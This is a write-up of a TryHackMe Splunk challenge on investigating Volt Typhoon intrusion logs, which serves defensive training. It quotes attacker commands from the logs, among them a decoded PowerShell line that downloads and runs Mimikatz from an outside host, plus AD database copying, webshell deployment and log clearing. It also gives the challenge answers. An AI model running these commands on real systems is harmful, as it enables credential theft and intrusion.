
## Volt Typhoon APT:  TryHackMe Room Write-Up

This is a write-up of the Volt Typhoon challenge on TryHackMe. **Volt Typhoon** is an infamous APT assumed to be of Chinese origin that focuses on espionage, data theft, and credential exfiltration.

It has different names from multiple threat analysis research groups and is very stealthy in its actions post-foothold, using nearly entirely only LOLBins (Living Off The Land binaries), such as wmic, ntdsutil, and netsh.

Mitre has a detailed paper highlighting their TTPs, links, and other information regarding this group here: https://attack.mitre.org/groups/G1017/ . CISA also similarly has an analysis here: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a . They have successfully

Breached and exploited multiple Western government institutions.

Today, we are going to be doing the Splunk-focused TryHackMe Challenge that uses the TTPs and the IOCs consistent with this APT based on logs of actual compromises:

## **Basic Intro:**

Firstly, we access the Splunk instance. (I will not be going over the VPN setup process here.) 

The Spunk instance will be your personal target machine's IP, and on port 8000.

Select search and reporting to access the logs: <img width="1883" height="824" alt="image" src="https://github.com/user-attachments/assets/41ab1db6-e771-4563-ba38-45c318db4165" />

First thing, change the time index to **All Time**. The default is 24 hours; this is to make sure we are not missing any logs and have a comprehensive analysis:

<img width="708" height="565" alt="image" src="https://github.com/user-attachments/assets/a39e4ef8-c119-4905-a9a7-9e7cd2204520" />

Now in the search bar, we need to select an **Index** so we can have our main source for logs, type index, and select main from the drop-down menu, or just put Index="main" manually.

 <img width="1907" height="716" alt="image" src="https://github.com/user-attachments/assets/82f5ed71-698b-42ac-acf9-6f397d7ebfd1" />

After enabling the search with the parameters, we find there are 2k logs. The logs can be filtered via the **source** and **source type** fields. This will be important when we are answering specific questions relating to TTPs/IOCs.

## **Initial Access**

We are asked to find how the threat actor gained a foothold. 

<img width="1300" height="295" alt="image" src="https://github.com/user-attachments/assets/c8fef76b-f1c9-4167-b97f-2266abe34025" />

We can check the ADSelfService Plus logs by filtering the main Index log according to the sourcetype "adss"

<img width="867" height="356" alt="image" src="https://github.com/user-attachments/assets/7aef6f5a-ef82-4508-b6c3-5b6d24ec8629" />

After applying this filter, we find that we have minimized the logs from 2k to around 650. In order to minimize this further and answer the question, we can filter these logs according to action_name and search for logs that contain the user string; 'dean'.

<img width="1736" height="538" alt="image" src="https://github.com/user-attachments/assets/6755523e-724b-4cad-89a9-41ce6d3b6414" />

Through this, we drastically minimize the logs and can narrow it down to two events that occurred at the same time, one being a successful change, the other being the failure, and with this, we have our timestamp for this action:

<img width="924" height="517" alt="image" src="https://github.com/user-attachments/assets/7a5e1e5a-9fa2-4881-b159-8798820d9756" />

Next Question:

**Shortly after Dean's account was compromised, the attacker created a new administrator account. What is the name of the new account that was created?**

This question has two hints that we can use, firstly, that this action is close to the password change we just identified, and that possibly Dean's account was used to make the new account due to the wording of the question.

Let's use the same filters as before, except changing the action_name to what we have available to us and removing Dean just to make sure: <img width="854" height="648" alt="image" src="https://github.com/user-attachments/assets/23659fa6-e0f3-4d75-aa67-d8b69f739489" />

The enrollment action name seems like an action name that could be of use to us, and the log entries for this are few; let's apply and check.

<img width="1564" height="625" alt="image" src="https://github.com/user-attachments/assets/97edcc0f-da9c-4c94-9f31-4a097795bdf8" />

When we check this, we see this new user was created at the same hour that Dean's account was compromised, and that this user is also an admin user that does not follow the organization's typical naming scheme. We check this and find it is correct.

## **Execution:**

Now that we have passed the Initial Access/"Foothold" stage, we are going to begin getting into the more detailed sections, the first of them being execution. We know that Volt Typhoon is a very stealthy APT. They nearly always will be using a Windows Binary in order to execute code and evade detection, which is important to note when hunting for their IOCs. Here are our first questions:

<img width="1281" height="488" alt="image" src="https://github.com/user-attachments/assets/5cab1493-02d7-436a-b3df-00d517d6f86b" />

The first question we are asked is an in-depth one. We need to find a specific command that is being used to enumerate two different servers. Let's first reset our filters and see what parameters we have available as a source:

<img width="1005" height="571" alt="image" src="https://github.com/user-attachments/assets/1d35403c-9534-432f-9994-a49cc566abc0" />

Ignoring what we already have checked, adss, we see there are a lot of logs with **wmic** and **PowerShell**, but we need to narrow it down a bit more. Let's put a filter that excludes **adss** and look for a string that is relevant to the question: let's try the word drive.

<img width="1869" height="661" alt="image" src="https://github.com/user-attachments/assets/47997169-e03a-422b-bf3c-80e2af79944a" />

We see here the attacker is enumerating the environment via the compromised DEAN account; we should note that. Amongst these events, there is valuable info, but not what we need for this question. Let's try the terms server01 and server02

<img width="1824" height="708" alt="image" src="https://github.com/user-attachments/assets/6be37dfc-b479-4619-8c09-b7e648f2cf62" />

Fortunately, despite our filter having a wide net, we only get 11 logs, and we can look through these for relevant information.

<img width="1644" height="444" alt="image" src="https://github.com/user-attachments/assets/7cc24a8e-095b-47e8-8fdb-71664a653d4f" />

When searching, we find a single command executed via wmic. This command contains the two servers, enumeration of their drives, and is running under the compromised DEAN account. We should check this and see if this is the answer. (Success).

Now the next question:

**The attacker uses ntdsutil to create a copy of the AD database. After moving the file to a web server, the attacker compresses the database. What password does the attacker set on the archive?**

As expected, our APT is very attached to using Living Off the Land binary techniques. Since we know what binary is used in this case, we should set a filter for actions executed by that binary and analyze what is found:

Let's first just search for the ntdsutil string and see which logs have this name present:

Fortunately, we find a single command present using this DLL:

<img width="1905" height="493" alt="image" src="https://github.com/user-attachments/assets/b24fef0a-f23a-48ae-8a60-5f7316c842fc" />

While we do not have the password or the archiving of the database yet, we do have the location to which he copied the AD database, and what he copied it as: 

**C:\Windows\Temp\tmp\temp.dit**

We should use this in our next search to see his next actions:

Let's set a filter for the file temp.dit:

<img width="1902" height="605" alt="image" src="https://github.com/user-attachments/assets/4881ec34-2dcc-4aa5-83fd-e64b23d4c725" />

The first event we find is the archiving action taking place, and we can see the password he has chosen:

<img width="1627" height="111" alt="image" src="https://github.com/user-attachments/assets/120792e8-037e-46da-b237-d43fdb5a1331" />

Let's put this in and check if we are correct (Success).

## **Persistence**

Here, we are going to analyze how Volt Typhoon likes to make a foothold. We are given a hint that this is going to be a base64 encoded webshell:

<img width="1303" height="322" alt="image" src="https://github.com/user-attachments/assets/d3ec5582-7117-4a68-bfdf-b62c832ce812" />

Now, just from instincts from doing boxes myself, I automatically default that the webshell is going to be present in a temp directory. This is a common procedure of threat actors and in pentests, as it is not a strictly monitored directory. Let's filter for the temp directory:

<img width="1911" height="699" alt="image" src="https://github.com/user-attachments/assets/54068547-96a6-4fe9-9b97-c54301f84b78" />

There are 32 logs, a bit too many for our liking, so we should filter them further. We can check the CommandLine field for anything interesting. 

<img width="1753" height="644" alt="image" src="https://github.com/user-attachments/assets/bee76fca-e124-442e-ba19-f90bebd09866" />

We see that echo is used in the command line once, echo is commonly used while encoding base64 payloads, and it is only used once; a reason to investigate. Let's set that as our command line filter with the temp string:

<img width="1900" height="717" alt="image" src="https://github.com/user-attachments/assets/f5d8ac92-6c9a-450b-a2b1-a239a1c6b934" />

Immediately, we find only one event and can already tell this is most likely malicious. PowerShell is running an obfuscated base64 command that is specifically being piped into **ntuser.ini**. This is another example of Volt Typhoon using the LOLBIN technique:

We can decode this payload either in a terminal or by using any online base64 decoder by copying and pasting the payload.

<img width="1282" height="929" alt="image" src="https://github.com/user-attachments/assets/d6b0d8a9-0662-4096-82c3-e6dcb1af3ca5" />

After decoding, we can clearly see that it is an ASP webshell. In fact it actually has the word webshell in its title. We know this was put into the **ntuser.ini** file in the **C:\Windows\Temp\** directory, so we should provide the C:\Windows\Temp\ directory as our answer (Success).

## **Defense Evasion:**

Our next section of analysis of this APT is their TTPs for **Defense Evasion**. We already know they use LOLBins for execution to evade defenses and Base64 encoded commands; however, what other tactics do they use in engagement?

<img width="1282" height="541" alt="image" src="https://github.com/user-attachments/assets/5a096f28-94e4-41f0-94ad-0ed94583e1e0" />

**In an attempt to begin covering their tracks, the attackers remove evidence of the compromise. They first start by wiping RDP records. What PowerShell cmdlet does the attacker use to remove the “Most Recently Used” record?**

Here, we are asked to find a PowerShell script that attempts to remove RDP logs. We can set our source or source type to only the PowerShell logs source to narrow the information:

<img width="1757" height="888" alt="image" src="https://github.com/user-attachments/assets/f9554a23-e936-4fe6-8c02-18778466576f" />

We still have 438 logs, which is a problem. Let's search for any logs with the string RDP:

<img width="681" height="195" alt="image" src="https://github.com/user-attachments/assets/030efd1a-e6b0-4090-9a6d-d25661e7ac4f" />

No results found. Let's check what relevant cmdlets are found in the PowerShell logs:  

<img width="1684" height="851" alt="image" src="https://github.com/user-attachments/assets/083bebbb-df43-4816-9cc3-f8fbe7dac154" />

Remove-Item seems like it could be relevant for our search, let's select it as a filter and see what comes up:

<img width="1641" height="291" alt="image" src="https://github.com/user-attachments/assets/1daaa847-1508-40b4-aa3a-168de202c62c" />

7 events are available, and within these seven, we find these:

<img width="1390" height="441" alt="image" src="https://github.com/user-attachments/assets/414ee16b-fafa-49fa-9f82-02b893afe9a6" />

<img width="1453" height="396" alt="image" src="https://github.com/user-attachments/assets/4aed7a4d-af0f-4dcf-a37d-b5cddb5a6d6c" />

This is valuable info, but not exactly what we needed. We are not seeing any RDP logs specifically being removed here. Let's look at any other cmdlets that can help:

One of the CMDLET options available is "Remove-itemProperty", let's see what comes up when we filter for that instead:

<img width="1194" height="777" alt="image" src="https://github.com/user-attachments/assets/25006747-8011-4d31-9a81-da8a22388741" />

We can see that they are removing things according to a specific registry path, but we are unaware of the registry path. Let's check the hint given for the question.

The hint given is  "T1070.007".  We should search this TTP ID in MITRE ATT&CK and see what comes up:

<img width="1792" height="628" alt="image" src="https://github.com/user-attachments/assets/b26aa456-5683-4f04-9c83-68efa3f3a1d9" />

Ok, now we have a bit of a better lead, let's search for these paths:

C:\Users\%username%\AppData\Local\Microsoft\TerminalServer Client\Cache\

C:\Users\%username%\Documents\Default.rdp

To make this quicker, you can also just pick a string from the path and see what is present. Let's choose "Default"

<img width="1309" height="836" alt="image" src="https://github.com/user-attachments/assets/dfe120d4-b199-41e7-b96e-f81e81da608f" />

Now we found what we were looking for, it is the exact log we were looking for earlier, they however have saved the path as the variable "Registry Path" to evade capture, this means the Remove-item logs we found earlier were actually correct, we can sort for logs around this time-period to add more evidence that this was their tactic for deleting logs:

Click on time on one of the logs, select 5 minutes, click apply, and remove the default string filter:

<img width="431" height="212" alt="image" src="https://github.com/user-attachments/assets/eebd9ba6-6a2e-47f7-a937-d08eb82c24c8" />

<img width="1363" height="882" alt="image" src="https://github.com/user-attachments/assets/5cfc3a75-ba72-4e9b-a41f-3caaa902ee41" />

We find 2 events, and they are almost exactly what we are looking for. If you check the other event with the same time, you will find the Remove-ItemProperty cmdlet used to remove the log. Let's put Remove-ItemProperty as our answer and continue (it works).

**The APT continues to cover their tracks by renaming and changing the extension of the previously created archive. What is the file name (with extension) created by the attackers?**

We have actually already uncovered the archive name from before, so it should not be easy to find out what they renamed it to. If you remember from earlier, the archive was named first cisco-up.7z and then piped into temp.dit, we just need to search for the original name cisco-up and see what they renamed the file to:

<img width="1896" height="652" alt="image" src="https://github.com/user-attachments/assets/1cbf5775-feb0-470a-b734-ab7f25ea44d8" />

A stealthy pseudo **.gif** file named **cl64.gif**. Let's pass this as our answer and check (Success).

**Under what regedit path does the attacker check for evidence of a virtualized environment?**

This action may be to check if they are in a honeypot or the like.

After searching under the list of executed Commandline commands, ie, the command line field for the PowerShell log, one command sticks out:

_CommandLine="Get-ItemProperty -Path \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\""_

Through checking Miter ATT&CK and the TTPs of the APT, we can see that this is sometimes queried to check if the environment is a virtual machine. Let's select this command and see what events are present:

<img width="1884" height="710" alt="image" src="https://github.com/user-attachments/assets/05eb789a-e974-44b2-a08f-122049088139" />

We can clearly see they are trying to find the keyword Virtual to assess if they are in a virtual machine. Let's put this regedit path as our answer: 

**HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control**

## **Credential Access**

<img width="1342" height="455" alt="image" src="https://github.com/user-attachments/assets/f4bda555-e186-4acd-b203-0ecff52a4380" />

Here, we are introduced to another one of Volt Typhoon's tactics. Since we are already given the PowerShell command used, we should filter for it and see what is available. We use this filter:

**index="main" sourcetype=powershell CommandLine="reg"**  and we find 8 events, this should be easy to sort through.

Within these events, we see the three applications they query 

<img width="1136" height="853" alt="image" src="https://github.com/user-attachments/assets/489054e0-3283-489f-be5c-83550f71b720" />

<img width="1606" height="866" alt="image" src="https://github.com/user-attachments/assets/566e065d-174d-4c4e-9503-a1cbff5eb018" />

**OpenSSH, Putty, and realVNC.**

**What is the full decoded command the attacker uses to download and run Mimikatz?**

Mimikatz is a popular tool for password/hash dumping on Windows and is commonly used by pentesters and threat actors alike.

It is important to realize here that they want us to **decode** the command, meaning the command itself will be **encoded**, so we cannot just search for the string 'mimikatz' and easily find what we are looking for. This APT tends to use PowerShell, so let's keep our source log on PowerShell.

Since we know it is a download, however, we should try commands with PS that do Downloads.

<img width="1894" height="668" alt="image" src="https://github.com/user-attachments/assets/68aecf5e-0ea7-47bb-87cb-e739916bd4d6" />

We don't find anything of substance, meaning the cmdlet itself might actually be encoded.

After running through all of the CMDLETs, one looks like it could be relevant: the **"-exec" cmdlet**, since the command is also running Mimikatz, it makes sense this could be relevant, let's set this as our filter:

<img width="1917" height="840" alt="image" src="https://github.com/user-attachments/assets/2734b3e6-00a2-426b-a2f4-94736e06a3ce" />

We have now found an extremely suspicious PS command, let's decode it with the base64 decode tool we used earlier:

<img width="988" height="471" alt="image" src="https://github.com/user-attachments/assets/2f6e98ff-7477-499d-9b3b-a42767d547ba" />

And we have found the malicious command and the Invoke Web Request cmdlet we were expecting earlier:

**Invoke-WebRequest -Uri "hxxp://voltyp[.]com/3/tlz/mimikatz[.]exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa: minidump lsass.dmp", "exit") -NoNewWindow -Wait****

*Note, I have defanged the URL, The answer expects the URL to be fanged

## **Discovery and Lateral Movement:**

<img width="1271" height="559" alt="image" src="https://github.com/user-attachments/assets/92a233e9-8c8d-48b1-943a-a9ae8f4b9b5f" />

**The attacker uses wevtutil, a log retrieval tool, to enumerate Windows logs. What event IDs does the attacker search for?
Answer Format: Increasing order separated by a space.**

This is another example of Volt Typhoon using the Living off the Land Technique. We can reset our filters and search for the string **wevtutil**:

<img width="1720" height="703" alt="image" src="https://github.com/user-attachments/assets/ee5edcf1-0907-4db3-8aa2-1480bd9c51ed" />

We have 12 events.

When we check the 12 events, we see these 3 EventIDs being queried via wevtutil:

<img width="1577" height="488" alt="image" src="https://github.com/user-attachments/assets/db88f18f-faf4-4c03-8e4f-f6aa572037c1" />

<img width="1536" height="252" alt="image" src="https://github.com/user-attachments/assets/4f84141e-7046-492c-b344-549285951efe" />

**4624, 4625, and 4769** this is our answer.

**Moving laterally to server-02, the attacker copies over the original web shell. What is the name of the new web shell that was created?**

Being familiar with Webshells, I already knew that it was most likely going to be a .asp or .aspx file. We can search for this string extension in the logs and narrow our search down.

<img width="1867" height="713" alt="image" src="https://github.com/user-attachments/assets/163aae1f-c220-4cdd-a4a7-579dda89b07e" />

We find some critical information here:

First, the malicious encoded webshell file in the Temp directory was accessed, it was first decoded and then put into a file called iisstart.aspx.:

**CommandLine=certutil -decode C:\Windows\Temp\ntuser.ini C:\Windows\Temp\iisstart.aspx**

Then, on the 29th, the new webshell file was moved to server02's public facing webserver as a new name: **"AuditReport.jspx"**

**CommandLine=Copy-Item -Path "C:\Windows\Temp\iisstart.aspx" -Destination "\\server-02\C$\inetpub\wwwroot\AuditReport.jspx**

All of this is being done through a combination of **certutil** and **Powershell cmdlets**. An example of Volt Typhoon's pattern**.

**AuditReport.jspx** Should be our answer in this case.

## **Collection**

<img width="1536" height="352" alt="image" src="https://github.com/user-attachments/assets/21211aab-a439-45c3-839f-68353859b9c9" />

Here, we can limit our log source to the PowerShell logs; however, we are not given much information this time around compared to the other questions. Let's check for PowerShell commands in the command line field that have to do with copy:

"Copy-Item" Seems like a good fit:

<img width="1792" height="804" alt="image" src="https://github.com/user-attachments/assets/dcc2d167-60be-4a04-bf27-b5fd9aa16b58" />

We get 11 logs, with one of them being the logs of the webshell copy we caught earlier.

Checking the events, we see they are collecting Browser backups

<img width="1091" height="44" alt="image" src="https://github.com/user-attachments/assets/4e06164d-2669-4fab-bf93-93aac8df546f" />

And .csv files that are in a directory called "FinanceBackup" 

<img width="1620" height="727" alt="image" src="https://github.com/user-attachments/assets/e8805fc6-47ad-434e-852f-71cd57bee9ea" />

We find a total of 3 different .csv files copied from that directory and browser information on multiple major web browsers.

We should put the CSV file names as our answer: **2022.csv 2023.csv 2024.csv**

## **C2 & Cleanup**

We can see now that Volt Typhoon has acted on their major objectives. Now, let's see what they perform in their conclusion and clean-up phase:

<img width="706" height="628" alt="image" src="https://github.com/user-attachments/assets/cc3d72fd-bd34-447b-be08-bd9de27f0b1b" />

Let's reset our logs to default and see what fields can help us.

<img width="1828" height="284" alt="image" src="https://github.com/user-attachments/assets/c2d93f4d-ca5f-45e4-ac16-2d7a0126295a" />

Two fields seem very pertinent for this question: Connect Address and Connect Port. Both only contain one value; let's apply this as a filter and see what events are present.

<img width="1619" height="130" alt="image" src="https://github.com/user-attachments/assets/baaadaa7-cec5-4f0f-a4cb-3ee6af061295" />

This is a privileged command that is opening up the victim machine to the remote IP 10.2.30.1 and port 8443 for future C2 communications. Let's provide this as our answer:  **10.2.30.1 8443**

**To conceal their activities, what are the four types of event logs the attacker clears on the compromised system?**

Earlier, we noticed the attacker was clearing multiple types of logs via PowerShell cmdlet Let's search for that cmdlet again or a similar one and list out the logs removed this time around:

<img width="1754" height="197" alt="image" src="https://github.com/user-attachments/assets/9ee06775-41b7-4bfd-93a2-aa022860a2a2" />

We check this, but don't find anything. Let's check the hint for a bit of a lead.

<img width="368" height="120" alt="image" src="https://github.com/user-attachments/assets/1c4734da-a6bd-44a5-9a86-165623aa988e" />

This is vague, but in the last question, they were using wevtutil for logs. Let's check for this and see what comes up:

<img width="1877" height="719" alt="image" src="https://github.com/user-attachments/assets/10ef70d8-8244-4053-b0c1-a6a4ca03275b" />

This is suspicious, and after checking this command flag **cl**, we find that this is a command to clear all logs for the parameters specificed on the system. In fact this technique is so common that there is even a Mitre writeup on using this specifically: https://attack.mitre.org/techniques/T1070/001/

So, for our last answer, we should provide these log sources:

**Application Security Setup System**

And with that, we have completed our analysis of Volt Typhoon.

